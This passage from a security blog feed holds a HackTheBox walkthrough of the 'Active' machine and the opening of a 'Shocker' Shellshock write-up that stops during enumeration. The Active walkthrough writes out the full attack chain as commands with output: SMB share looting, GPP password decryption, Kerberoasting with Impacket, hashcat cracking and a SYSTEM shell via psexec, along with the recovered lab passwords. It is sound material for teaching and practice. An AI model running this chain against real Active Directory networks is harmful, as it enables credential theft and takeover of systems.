<li>Nmap</li>
<li>Impacket</li>
<li>CrackMapExec</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan (after  <code>-p-</code> performed) discovers a bunch of open ports. The most notables ports are: 53 (DNS), 88 (Kerberos), 139-445 (SMB/RPC), and 389 (LDAP). According to these open ports, I can safely assume this is an Active Directory (as the box name implies).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
$ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,04915,49169,49172,49180 -sC -sV -oA nmap/10-tcp-allport-script-active 10.10.10.100
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-10 23:20 EDT
Nmap scan report <span class="k">for</span> 10.10.10.100
Host is up <span class="o">(</span>0.072s latency<span class="o">)</span>.

PORT      STATE  SERVICE       VERSION
53/tcp    open   domain        Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span> <span class="o">(</span>Windows Server <span class="m">2008</span> R2 SP1<span class="o">)</span>
<span class="p">|</span> dns-nsid: 
<span class="p">|</span>_  bind.version: Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span>
88/tcp    open   kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2021-07-11 03:20:53Z<span class="o">)</span>
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open   ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: active.htb, Site: Default-First-Site-Name<span class="o">)</span>
445/tcp   open   microsoft-ds?
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: active.htb, Site: Default-First-Site-Name<span class="o">)</span>
3269/tcp  open   tcpwrapped
4915/tcp  closed frcs
5722/tcp  open   msrpc         Microsoft Windows RPC
9389/tcp  open   mc-nmf        .NET Message Framing
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
<span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="p">|</span>_http-title: Not Found
49152/tcp open   msrpc         Microsoft Windows RPC
49153/tcp open   msrpc         Microsoft Windows RPC
49154/tcp open   msrpc         Microsoft Windows RPC
49155/tcp open   msrpc         Microsoft Windows RPC
49157/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
49169/tcp open   msrpc         Microsoft Windows RPC
49172/tcp open   msrpc         Microsoft Windows RPC
49180/tcp open   msrpc         Microsoft Windows RPC
Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
<span class="p">|</span>_clock-skew: 4s
<span class="p">|</span> smb2-security-mode: 
<span class="p">|</span>   2.02: 
<span class="p">|</span>_    Message signing enabled and required
<span class="p">|</span> smb2-time: 
<span class="p">|</span>   date: 2021-07-11T03:21:48
<span class="p">|</span>_  start_date: 2021-07-09T05:18:19

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 71.11 seconds
</code></pre></div><p><code>nmap</code> identified the domain name as <code>active.htb</code> and the OS version to be Windows Server 2008, which most likely vulnerable to ZeroLogon (CVE-2020-1472) as well as PrintNightmare (CVE-2021-1675/CVE-2021-34527). But, I&rsquo;ll consider these vulns as alternative methods and put them in separate post (see: <a href="https://fahmifj.github.io/blog/play-with-printnightmare/">PrintNightmare</a>).</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-53---dns">TCP 53 - DNS</h3>
<p>There is no zone transfer in this machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
$ dig axfr @10.10.10.100 10.10.10.100

<span class="p">;</span> &lt;&lt;&gt;&gt; DiG 9.16.15-Debian &lt;&lt;&gt;&gt; axfr @10.10.10.100 10.10.10.100
<span class="p">;</span> <span class="o">(</span><span class="m">1</span> server found<span class="o">)</span>
<span class="p">;;</span> global options: +cmd
<span class="p">;</span> Transfer failed.
</code></pre></div><h3 id="tcp-139445---smb">TCP 139,445 - SMB</h3>
<p><code> smbmap</code> identifies that anonymous logon is allowed and it has read access on  <code>Replication</code> share.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
$ smbmap -u <span class="s1">&#39;&#39;</span> -p <span class="s1">&#39;&#39;</span> -H 10.10.10.100
<span class="o">[</span>+<span class="o">]</span> IP: 10.10.10.100:445        Name: active.htb                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
</code></pre></div><h4 id="replication-share">Replication Share</h4>
<p>The <code>Replication</code> share contains a lot of folders, so I&rsquo;ll just download them recursively.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
$ smbclient -N //10.10.10.100/Replication
Anonymous login successful
Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> ls
  .                                   D        <span class="m">0</span>  Sat Jul <span class="m">21</span> 06:37:44 <span class="m">2018</span>
  ..                                  D        <span class="m">0</span>  Sat Jul <span class="m">21</span> 06:37:44 <span class="m">2018</span>
  active.htb                          D        <span class="m">0</span>  Sat Jul <span class="m">21</span> 06:37:44 <span class="m">2018</span>

                <span class="m">10459647</span> blocks of size 4096. <span class="m">5722238</span> blocks available
smb: <span class="se">\&gt;</span> recurse on
smb: <span class="se">\&gt;</span> prompt of
smb: <span class="se">\&gt;</span> mget * 
getting file <span class="se">\a</span>ctive.htb<span class="se">\P</span>olicies<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\G</span>PT.INI of size <span class="m">23</span> as active.htb/Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/GPT.INI <span class="o">(</span>0.1 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.1 KiloBytes/sec<span class="o">)</span>
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p>The only interesting file there is the <code>Groups.xml</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active.htb» «10.10.14.83» 
$ find . -type f -iname groups.xml                                                                            
./Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/MACHINE/Preferences/Groups/Groups.xml
</code></pre></div><p>This <code>groups.xml</code> contains a <code>cpassword</code> of user <code>active.htb\SVC_TGS</code>. I&rsquo;ll note the password</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active.htb» «10.10.14.83» 
$ cat ./Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/MACHINE/Preferences/Groups/Groups.xml
&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">&#34;1.0&#34;</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span>?&gt;
&lt;Groups <span class="nv">clsid</span><span class="o">=</span><span class="s2">&#34;{3125E937-EB16-4b4c-9934-544FC6D24D26}&#34;</span>&gt;&lt;User <span class="nv">clsid</span><span class="o">=</span><span class="s2">&#34;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&#34;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;active.htb\SVC_TGS&#34;</span> <span class="nv">image</span><span class="o">=</span><span class="s2">&#34;2&#34;</span> <span class="nv">changed</span><span class="o">=</span><span class="s2">&#34;2018-07-18 20:46:06&#34;</span> <span class="nv">uid</span><span class="o">=</span><span class="s2">&#34;{EF57DA28-5F69-4530-A59E-AAB58578219D}&#34;</span>&gt;&lt;Properties <span class="nv">action</span><span class="o">=</span><span class="s2">&#34;U&#34;</span> <span class="nv">newName</span><span class="o">=</span><span class="s2">&#34;&#34;</span> <span class="nv">fullName</span><span class="o">=</span><span class="s2">&#34;&#34;</span> <span class="nv">description</span><span class="o">=</span><span class="s2">&#34;&#34;</span> <span class="nv">cpassword</span><span class="o">=</span><span class="s2">&#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#34;</span> <span class="nv">changeLogon</span><span class="o">=</span><span class="s2">&#34;0&#34;</span> <span class="nv">noChange</span><span class="o">=</span><span class="s2">&#34;1&#34;</span> <span class="nv">neverExpires</span><span class="o">=</span><span class="s2">&#34;1&#34;</span> <span class="nv">acctDisabled</span><span class="o">=</span><span class="s2">&#34;0&#34;</span> <span class="nv">userName</span><span class="o">=</span><span class="s2">&#34;active.htb\SVC_TGS&#34;</span>/&gt;&lt;/User&gt;
&lt;/Groups&gt;
</code></pre></div><h3 id="tcp-389---ldap">TCP 389 - LDAP</h3>
<p>There is nothing much I can do in LDAP.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active.htb» «10.10.14.83»  
$ ldapsearch -LLL -x -h 10.10.10.100 -s base namingContexts 
dn:
namingContexts: <span class="nv">DC</span><span class="o">=</span>active,DC<span class="o">=</span>htb
namingContexts: <span class="nv">CN</span><span class="o">=</span>Configuration,DC<span class="o">=</span>active,DC<span class="o">=</span>htb
namingContexts: <span class="nv">CN</span><span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>active,DC<span class="o">=</span>htb
namingContexts: <span class="nv">DC</span><span class="o">=</span>DomainDnsZones,DC<span class="o">=</span>active,DC<span class="o">=</span>htb
namingContexts: <span class="nv">DC</span><span class="o">=</span>ForestDnsZones,DC<span class="o">=</span>active,DC<span class="o">=</span>htb
→ kali@kali «active» «10.10.14.75» 
$ ldapsearch -LLL -x -h 10.10.10.100 -b <span class="s2">&#34;dc=active,dc=htb&#34;</span> 
Operations error <span class="o">(</span>1<span class="o">)</span>
Additional information: 000004DC: LdapErr: DSID-0C09075A, comment: In order to perform this operation a successful <span class="nb">bind</span> must be completed on the connection., data 0, v1db1
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="access-as-svc_tgs">Access as SVC_TGS</h3>
<h4 id="group-policy-preferences-gpp---password-decrypt">Group Policy Preferences (GPP) - Password Decrypt</h4>
<p>In Windows Server 2008, Microsoft introduced a feature called <strong>Group Policy Preferences</strong>. This feature allows various Windows configurations/settings, including changing local administrator passwords, to be distributed to domain-joined computers through Group Policy.</p>
<p>When a GPP is created, it creates an associated XML file in SYSVOL share. Some of the XML files may contains a set of credentials encrypted with AES-256. However, Microsoft <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN">published the encryption key</a> which can be used to decrypt the password (<code>cpassword</code>) in the XML file.</p>
<p>Kali comes with a tool called <code>gpp-decrypt</code>, and this tool can be used to decrypt the <code>cpassword</code> I obtained from the <code>Groups.xml</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active.htb» «10.10.14.83» 
$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ          
GPPstillStandingStrong2k18
</code></pre></div><h4 id="users-share">Users Share</h4>
<p><code>CrackMapExec</code> confirms that the credentials (<code>SVC_TGS:GPPstillStandingStrong2k18</code>) are valid. I have read access now on the three other shares.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
$ crackmapexec smb active.htb -u <span class="s1">&#39;SVC_TGS&#39;</span> -p <span class="s1">&#39;GPPstillStandingStrong2k18&#39;</span> --shares
SMB         10.10.10.100    <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows 6.1 Build <span class="m">7601</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:active.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.100    <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> active.htb<span class="se">\S</span>VC_TGS:GPPstillStandingStrong2k18 
SMB         10.10.10.100    <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> Enumerated shares
SMB         10.10.10.100    <span class="m">445</span>    DC               Share           Permissions     Remark
SMB         10.10.10.100    <span class="m">445</span>    DC               -----           -----------     ------
SMB         10.10.10.100    <span class="m">445</span>    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    <span class="m">445</span>    DC               C$                              Default share
SMB         10.10.10.100    <span class="m">445</span>    DC               IPC$                            Remote IPC
SMB         10.10.10.100    <span class="m">445</span>    DC               NETLOGON        READ            Logon server share 
SMB         10.10.10.100    <span class="m">445</span>    DC               Replication     READ            
SMB         10.10.10.100    <span class="m">445</span>    DC               SYSVOL          READ            Logon server share 
SMB         10.10.10.100    <span class="m">445</span>    DC               Users           READ  
</code></pre></div><p>Looking into the  <code>Users</code> share, I&rsquo;m sure this share is most likely <code>C:\Users\</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active.htb» «10.10.14.83» 
$ smbclient -N //10.10.10.100/Users -U <span class="s1">&#39;SVC_TGS%GPPstillStandingStrong2k18&#39;</span>
Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> ls
  .                                  DR        <span class="m">0</span>  Sat Jul <span class="m">21</span> 10:39:20 <span class="m">2018</span>
  ..                                 DR        <span class="m">0</span>  Sat Jul <span class="m">21</span> 10:39:20 <span class="m">2018</span>
  Administrator                       D        <span class="m">0</span>  Mon Jul <span class="m">16</span> 06:14:21 <span class="m">2018</span>
  All Users                       DHSrn        <span class="m">0</span>  Tue Jul <span class="m">14</span> 01:06:44 <span class="m">2009</span>
  Default                           DHR        <span class="m">0</span>  Tue Jul <span class="m">14</span> 02:38:21 <span class="m">2009</span>
  Default User                    DHSrn        <span class="m">0</span>  Tue Jul <span class="m">14</span> 01:06:44 <span class="m">2009</span>
  desktop.ini                       AHS      <span class="m">174</span>  Tue Jul <span class="m">14</span> 00:57:55 <span class="m">2009</span>
  Public                             DR        <span class="m">0</span>  Tue Jul <span class="m">14</span> 00:57:55 <span class="m">2009</span>
  SVC_TGS                             D        <span class="m">0</span>  Sat Jul <span class="m">21</span> 11:16:32 <span class="m">2018</span>

                <span class="m">10459647</span> blocks of size 4096. <span class="m">5722238</span> blocks available
</code></pre></div><p>And there is a user flag in <code>SVC_TGS\Desktop</code>. I can read the flag with <code>more</code> command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">smb: \&gt; ls SVC_TGS\Desktop\
  .                                   D        0  Sat Jul 21 11:14:42 2018
  ..                                  D        0  Sat Jul 21 11:14:42 2018
  user.txt                            A       34  Sat Jul 21 11:06:25 2018

                10459647 blocks of size 4096. 5722238 blocks available
smb: \&gt; more SVC_TGS\Desktop\user.txt
getting file \SVC_TGS\Desktop\user.txt of size 34 as /tmp/smbmore.uhunaP (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
</code></pre></div><p><img class="img-container" src="imgs/image-20210711104959070.png" alt="image-20210711104959070"  />
</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-nt-authoritysystem">Shell as NT Authority\SYSTEM</h3>
<h4 id="ldap---spn-enumeration">LDAP - SPN enumeration</h4>
<p>With <code>SVC_TGS</code> credentials, I&rsquo;m able to access the LDAP service.</p>
<p>It was found that the administrator has <code>servicePrincipalName</code> (SPN) attribute.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
$ ldapsearch -LLL -x -D <span class="s1">&#39;SVC_TGS@active.htb&#39;</span> -w <span class="s1">&#39;GPPstillStandingStrong2k18&#39;</span> -h 10.10.10.100 -b <span class="s2">&#34;dc=active,dc=htb&#34;</span> <span class="s2">&#34;(&amp;(objectClass=user)(objectCategory=user)(servicePrincipalName=*))&#34;</span> 
dn: <span class="nv">CN</span><span class="o">=</span>Administrator,CN<span class="o">=</span>Users,DC<span class="o">=</span>active,DC<span class="o">=</span>htb

...<span class="o">[</span>SNIP<span class="o">]</span>...
adminCount: <span class="m">1</span>
accountExpires: <span class="m">0</span>
logonCount: <span class="m">34</span>
sAMAccountName: Administrator
sAMAccountType: <span class="m">805306368</span>
servicePrincipalName: active/CIFS:445
objectCategory: <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>active,DC<span class="o">=</span>htb
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h4 id="kerberoasting">Kerberoasting</h4>
<p>If a Service Principal Name is registered into a user account, the account is vulnerable to an attack called <strong>Kerberoasting</strong>. It is an attack against Kerberos which steals a Service Ticket.</p>
<p>The attack is well explained in <a href="https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/">this blog</a> and <a href="https://hebo.gitbook.io/hackbook/active-directory/kerberoasting#0x02-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5">this one</a>, but I will try to give an overview using the following image created by <a href="http://www.diva-portal.se/smash/get/diva2:1358687/FULLTEXT01.pdf">David Freimannis</a>. The <strong>Kerberoasting</strong> attack indicated by a red box.</p>
<p><img class="img-container" src="imgs/image-20210715120848088.png" alt="image-20210715120848088"  title="Kerberos Mechanism"  />
</p>
<center><small>Taken from “Vulnerability Assessment of Authentication Methods in a Large-Scale Computer System” by David Freimanis</small></center>
<p>In the image above, step number 4, the client/user will obtains a Ticket Granting Service (TGS) ticket. This ticket is encrypted with NTLM hash (derived from password) of a service account. If the client itself has been compromised, an attacker could easily steal the ticket and attempt an offline brute-force to recover the password from the ticket.</p>
<p>In this case, let&rsquo;s start from step 3, and say we want to access a CIFS service. The server (KDC) then searches for SPN of the CIFS service, which is <code>active/CIFS:445</code>, and it is registered to the administrator account. Once the SPN is found, server will issue a TGS ticket encrypted with NTLM hash of the administrator account and send the ticket to the client. Now that we have the TGS ticket, but instead of using this ticket to authenticate to the CIFS service, we keep that ticket and attempt a brute-force against it to recover the administrator password.</p>
<blockquote>
<p>If the SPN is registered to a computer account, it would be almost impossible to crack the TGS ticket since a computer account password is a random 128 character.</p>
</blockquote>
<p>There are several tools out there that can be used to perform a Kerberoasting attack, but I&rsquo;ll use the one from Impacket called <code>Impacket-GetUserSPNs</code>. The tool captures the ticket and automatically formats it into hashcat crackable format.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.75» 
$ impacket-GetUserSPNs active.htb/SVC_TGS:<span class="s1">&#39;GPPstillStandingStrong2k18&#39;</span> -dc-ip 10.10.10.100 -request-user administrator
Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  <span class="nv">CN</span><span class="o">=</span>Group Policy Creator Owners,CN<span class="o">=</span>Users,DC<span class="o">=</span>active,DC<span class="o">=</span>htb  2018-07-18 15:06:40.351723  2021-07-14 12:36:18.277545             



<span class="nv">$krb5tgs$23$*</span>Administrator<span class="nv">$ACTIVE</span>.HTB<span class="nv">$active</span>.htb/Administrator*<span class="nv">$92</span>c75d0a49cbaf166e656a7350827d0c<span class="nv">$a775e30</span>...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h4 id="tgs-crack">TGS Crack</h4>
<p>The password of the TGS can be recovered using hashcat.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ ./hashcat.exe -m <span class="m">13100</span> hashes/svc_tgs.krbhash ../../rockyou.txt -O
...<span class="o">[</span>SNIP<span class="o">]</span>...
<span class="nv">$krb5tgs$23$*</span>Administrator<span class="nv">$ACTIVE</span>.HTB<span class="nv">$active</span>.htb/Administrator*<span class="nv">$92</span>c75d0a49cbaf166e656a7350827d0c<span class="nv">$a775e30</span>...<span class="o">[</span>SNIP<span class="o">]</span>...:Ticketmaster1968
</code></pre></div><p>It is  <code>Ticketmaster1968</code>.</p>
<h4 id="impacket-psexec">Impacket-psexec</h4>
<p>Using the administrator account along with the obtained password, I&rsquo;m able to get a shell as local system using <code>impacket-psexec</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.83» 
$ impacket-psexec active.htb/administrator:<span class="s1">&#39;Ticketmaster1968&#39;</span>@10.10.10.100
Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation

<span class="o">[</span>*<span class="o">]</span> Requesting shares on 10.10.10.100.....
<span class="o">[</span>*<span class="o">]</span> Found writable share ADMIN$
<span class="o">[</span>*<span class="o">]</span> Uploading file olAAJsqj.exe
<span class="o">[</span>*<span class="o">]</span> Opening SVCManager on 10.10.10.100.....
<span class="o">[</span>*<span class="o">]</span> Creating service mvjR on 10.10.10.100.....
<span class="o">[</span>*<span class="o">]</span> Starting service mvjR.....
<span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
Microsoft Windows <span class="o">[</span>Version 6.1.7601<span class="o">]</span>
Copyright <span class="o">(</span>c<span class="o">)</span> <span class="m">2009</span> Microsoft Corporation.  All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami <span class="o">&amp;&amp;</span> ipconfig
nt authority<span class="se">\s</span>ystem

Windows IP Configuration


Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.10.10.100
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2

Tunnel adapter isatap.<span class="o">{</span>B3FEC2C7-47CA-4014-A441-A3A5CDDC983C<span class="o">}</span>:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 
</code></pre></div><p>The root flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;type <span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
b5fc76...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><hr>
<h2 id="references">Reference(s)</h2>
<ul>
<li><a href="https://adsecurity.org/?p=2288">https://adsecurity.org/?p=2288</a></li>
<li><a href="https://hebo.gitbook.io/hackbook/active-directory/kerberoasting">https://hebo.gitbook.io/hackbook/active-directory/kerberoasting</a></li>
<li><a href="https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/">https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/</a></li>
<li><a href="http://www.diva-portal.se/smash/get/diva2:1358687/FULLTEXT01.pdf">http://www.diva-portal.se/smash/get/diva2:1358687/FULLTEXT01.pdf</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Shocker</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-shocker/</link>
      <pubDate>Tue, 13 Jul 2021 11:30:31 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-shocker/</guid>
      <description>Shocker is an easy Linux machines from HackTheBox that introduces a vulnerability called Shellshock (CVE-2014-6271). Exploiting this vulnerability results in an unauthenticated remote code execution, which is leveraged to gain a foothold in the system. There is a sudo privilege on perl , and this can leveraged as well to gain root shell.
In the end of this write-up, I&amp;rsquo;ll see how the Shellshock vulnerability works.
Skills Learned  Exploitation of Shellshock vulnerability Exploitation of sudo privileges on perl  Tools  Nmap Burp Suite Gobuster  Reconnaissance Nmap A full TCP scan discovers two open ports: an Apache web server on port 80 and SSH on port 2222.</description>
      <content:encoded><![CDATA[<p>Shocker is an easy Linux machines from HackTheBox that introduces a vulnerability called Shellshock (CVE-2014-6271). Exploiting this vulnerability results in an unauthenticated remote code execution, which is leveraged to gain a foothold in the system. There is a sudo privilege on <code>perl</code> , and this can leveraged as well to gain root shell.</p>
<p>In the end of this write-up, I&rsquo;ll see how the Shellshock vulnerability works.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Exploitation of Shellshock vulnerability</li>
<li>Exploitation of sudo privileges on perl</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Nmap</li>
<li>Burp Suite</li>
<li>Gobuster</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan discovers two open ports: an Apache web server on port 80 and SSH on port 2222.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
$ nmap -p- -sV -oA nmap/10-tcp-allport-shocker 10.10.10.56 
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-10 20:24 EDT
Nmap scan report <span class="k">for</span> 10.10.10.56
Host is up <span class="o">(</span>0.065s latency<span class="o">)</span>.
Not shown: <span class="m">65533</span> closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 98.00 seconds
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>The site serves only one a text and an image.</p>
<p><img class="img-container" src="imgs/image-20210711072532615.png" alt="image-20210711072532615"  />
</p>
<p>The server response contains uncommon Header called <code>Accept-Ranges</code>. According to <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Range_requests#requesting_a_specific_range_from_a_server">MDN</a>, this header is allows us to control the portion of the HTTP message.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
$ curl -I http://10.10.10.56
HTTP/1.1 <span class="m">200</span> OK
Date: Sun, <span class="m">11</span> Jul <span class="m">2021</span> 00:49:51 GMT
Server: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
Last-Modified: Fri, <span class="m">22</span> Sep <span class="m">2017</span> 20:01:19 GMT
ETag: <span class="s2">&#34;89-559ccac257884&#34;</span>
Accept-Ranges: bytes
Content-Length: <span class="m">137</span>
Vary: Accept-Encoding
Content-Type: text/html
</code></pre></div><p>A <a href="https://www.rapid7.com/db/modules/auxiliary/dos/http/apache_range_dos/">quick search</a> on google finds that it can be used for DDoS attack.</p>
<h4 id="gobuster">Gobuster</h4>
<p>A <code>gobuster</code> scan finds two directories:  <code>/cgi-bin/</code> and <code>/icons</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
$ gobuster dir -u http://10.10.10.56/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster/gobuster-S-80 -f         
<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.10.56/
<span class="o">[</span>+<span class="o">]</span> Method:                  GET
<span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
<span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
<span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
<span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
<span class="o">[</span>+<span class="o">]</span> Add Slash:               <span class="nb">true</span>
<span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
<span class="o">===============================================================</span>
2021/07/10 20:26:07 Starting gobuster in directory enumeration <span class="nv">mode</span>
<span class="o">===============================================================</span>
